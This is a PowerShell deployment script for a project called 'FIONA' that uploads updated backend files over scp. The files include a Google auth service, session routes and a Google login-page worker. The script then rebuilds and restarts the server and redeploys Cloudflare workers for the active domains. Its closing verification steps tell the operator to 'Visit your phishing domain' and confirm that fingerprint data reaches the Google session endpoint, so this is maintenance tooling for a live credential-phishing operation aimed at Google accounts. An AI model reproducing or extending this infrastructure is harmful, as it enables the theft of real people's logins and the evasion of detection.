# PowerShell Script - Upload Files and Deploy Workers
# Run this on your Windows machine

param(
    [Parameter(Mandatory=$true)]
    [string]$ServerIP,
    
    [string]$ServerUser = "root"
)

Write-Host "=============================================="
Write-Host "FIONA - Upload Updated Files & Deploy Workers"
Write-Host "=============================================="
Write-Host ""

$LocalPath = "C:\Users\happy\OneDrive\Desktop\prxyauth-desktop-1.2.4"
$ServerPath = "/var/www/fiona"

Write-Host "Step 1: Uploading updated backend files..."

# Upload the 4 key files with fingerprint changes
$filesToUpload = @(
    @{
        Local = "$LocalPath\backend\src\services\browser\google-auth-http.service.ts"
        Remote = "$ServerPath/backend/src/services/browser/google-auth-http.service.ts"
    },
    @{
        Local = "$LocalPath\backend\src\services\browser\browser-launch.config.ts"
        Remote = "$ServerPath/backend/src/services/browser/browser-launch.config.ts"
    },
    @{
        Local = "$LocalPath\backend\src\routes\public\session.routes.ts"
        Remote = "$ServerPath/backend/src/routes/public/session.routes.ts"
    },
    @{
        Local = "$LocalPath\backend\login-pages\google\worker.js"
        Remote = "$ServerPath/backend/login-pages/google/worker.js"
    }
)

foreach ($file in $filesToUpload) {
    Write-Host "  Uploading: $($file.Local | Split-Path -Leaf)..."
    scp $file.Local "${ServerUser}@${ServerIP}:$($file.Remote)"
    if ($LASTEXITCODE -eq 0) {
        Write-Host "    ✅ Uploaded successfully" -ForegroundColor Green
    } else {
        Write-Host "    ❌ Upload failed!" -ForegroundColor Red
        exit 1
    }
}

Write-Host ""
Write-Host "Step 2: Building backend on server..."

$buildCommands = @"
cd $ServerPath/backend
npm run build
"@

ssh "${ServerUser}@${ServerIP}" $buildCommands

if ($LASTEXITCODE -eq 0) {
    Write-Host "✅ Backend built successfully" -ForegroundColor Green
} else {
    Write-Host "❌ Build failed! Check server logs" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "Step 3: Restarting backend..."

ssh "${ServerUser}@${ServerIP}" "pm2 restart fiona-backend"

if ($LASTEXITCODE -eq 0) {
    Write-Host "✅ Backend restarted" -ForegroundColor Green
} else {
    Write-Host "⚠️  Restart failed, try manually: pm2 restart fiona-backend" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "Step 4: Checking for active domains to update..."

$checkDomainsCmd = @"
cd $ServerPath/backend
sqlite3 prisma/dev.db "SELECT COUNT(*) FROM Domain WHERE status='active' AND cfWorkerName IS NOT NULL;"
"@

$domainCount = ssh "${ServerUser}@${ServerIP}" $checkDomainsCmd

Write-Host "Found $domainCount active domain(s) with deployed workers"

if ([int]$domainCount -gt 0) {
    Write-Host ""
    Write-Host "Step 5: Triggering worker redeployment..."
    
    $deployCmd = @"
cd $ServerPath/backend
bash ~/UPDATE-WORKERS-FINGERPRINT.sh
"@
    
    # First upload the deployment script
    scp "$LocalPath\UPDATE-WORKERS-FINGERPRINT.sh" "${ServerUser}@${ServerIP}:~/UPDATE-WORKERS-FINGERPRINT.sh"
    ssh "${ServerUser}@${ServerIP}" "chmod +x ~/UPDATE-WORKERS-FINGERPRINT.sh"
    
    # Run the deployment script
    ssh "${ServerUser}@${ServerIP}" $deployCmd
}

Write-Host ""
Write-Host "=============================================="
Write-Host "✅ UPDATE COMPLETE!"
Write-Host "=============================================="
Write-Host ""
Write-Host "VERIFICATION STEPS:"
Write-Host "1. Visit your phishing domain"
Write-Host "2. Open DevTools (F12) → Network tab"
Write-Host "3. Enter email and click Next"
Write-Host "4. Check POST /api/google/session/start request"
Write-Host "5. Should see 'fingerprint' in request payload"
Write-Host ""
Write-Host "CHECK BACKEND LOGS:"
Write-Host "ssh ${ServerUser}@${ServerIP}"
Write-Host "pm2 logs fiona-backend --lines 50 | grep FINGERPRINT"
Write-Host ""
